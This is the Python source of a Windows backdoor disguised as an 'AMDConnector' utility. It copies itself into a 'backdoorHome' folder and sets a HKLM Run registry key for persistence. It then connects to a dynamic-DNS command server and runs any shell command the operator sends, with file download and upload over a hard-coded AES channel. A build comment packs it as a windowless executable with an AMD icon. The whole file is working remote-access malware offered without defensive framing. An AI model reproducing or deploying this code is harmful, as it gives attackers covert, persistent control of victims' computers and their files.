import os
import shutil
import subprocess
import base64
import socket
import time
import winreg as reg
from Encryptor import AES_Encryption
import traceback
#pyinstaller --icon=amd.ico --noconsole --onefile .\AMDConnector.py

class ConnectorClient:

    def __init__(self, ip, port):
            try:
                if not os.path.exists('C:\Program Files\backdoorHome'):
                    os.makedirs('C:\Program Files\backdoorHome')
                file_location = "C:\Program Files\backdoorHome"
                directory_files = os.listdir(file_location)
                current_file_name = os.path.basename(__file__)[:-2] + "exe"
                if current_file_name not in directory_files:
                    sourcePath = current_file_name

                    destinationPath = file_location + "\\" + current_file_name

                    shutil.copyfile(sourcePath, destinationPath)

                    key = reg.HKEY_LOCAL_MACHINE
                    key_value = "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"


                    open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)


                    reg.SetValueEx(open, "AMDConnector", 0, reg.REG_SZ, destinationPath)

            except:
                pass
            os.system("chcp 65001")
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.connect((ip, port))
            self.key = "password"
            self.iv = "initialization vector"
            self.cipher = AES_Encryption(key=self.key, iv=self.iv)

    def encrypt_stuff(self, message):
        return self.cipher.encrypt(message)

    def decrypt_stuff(self, message):
        return self.cipher.decrypt(message)

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, stdin=subprocess.DEVNULL, stderr=subprocess.DEVNULL).decode()

    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def reliable_send(self, data):
        encrypted_data = self.cipher.encrypt(data)
        if encrypted_data == "Failed To Encrypt String":
            encrypted_data = self.cipher.encrypt(base64.b64encode(bytes(data, "utf-8")).decode())
        data_length = len(encrypted_data)
        self.connection.send(self.cipher.encrypt(str(data_length)))
        self.connection.send(encrypted_data)

    def reliable_receive(self):
        data_length_encrypted = self.connection.recv(1024)
        data_length = self.decrypt_stuff(data_length_encrypted)
        encrypted_data = self.connection.recv(int(data_length))
        decrypted_data = self.decrypt_stuff(encrypted_data)
        return decrypted_data

    def read_file(self, path):
        with open(path, "rb") as file:
            data = file.read()
            string_base64_data = base64.b64encode(data).decode('ascii')
            return string_base64_data

    def write_file(self, command):
        split_command = command.split()
        with open(split_command[1], "wb") as file:
            file.write(base64.b64decode(split_command[2]))
            return ("[+] Upload successful")

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                command = base64.b64decode(command).decode("utf-8")
            except:
                pass

            try:
                if command == "exit":
                    self.connection.close()
                    exit()
                elif command == "cd ..":
                    command = self.execute_system_command("echo %cd%")
                    command = command.rpartition('\\')[0]
                    command_result = self.change_working_directory(command)
                elif command[0:2] == "cd":
                    #split_command = command.split()
                    command_result = self.change_working_directory(command[3:])
                elif command[0:8] == "download":
                    command_result = self.read_file(command[9:])
                elif command[0:6] == "upload":
                    command_result = self.write_file(command)
                else:
                    command_result = self.execute_system_command(command)
            except Exception as e:
                command_result = "[-] Error during command execution in Client: " + str(e) + " " \
                                 + str(traceback.format_exc())

            self.reliable_send(command_result)


while True:
    try:
        backdoor = ConnectorClient("thegreatserver9999.ddns.net", 8777)#thegreatserver9999.ddns.net
        backdoor.run()
    except:
        time.sleep(300)
        continue
